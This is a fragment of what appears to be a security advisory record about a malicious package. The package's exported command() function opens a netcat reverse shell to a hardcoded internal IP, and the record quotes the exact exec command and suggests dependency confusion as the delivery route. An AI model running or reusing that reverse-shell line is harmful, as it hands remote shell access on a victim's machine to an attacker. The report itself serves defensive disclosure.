  "summary": "Reverse shell backdoor to hardcoded internal IP in exported command()",
  "details": "The package's exported command() function in index.js executes a bash reverse shell via netcat to the hardcoded RFC1918 address 10.0.74.133 on port 13337, spawning /bin/bash on the caller's machine (exec('/bin/bash -c \"nc -vn 10.0.74.133 13337 -e /bin/bash\"')). Any caller invoking the advertised API triggers an outbound reverse-shell connection giving the operator of that host interactive shell access on the installer's environment. The package name (internal-sounding identifier with a version suffix) combined with a self-referential dependency declaration is consistent with a dependency-confusion artifact targeting an organization's internal registry name.",
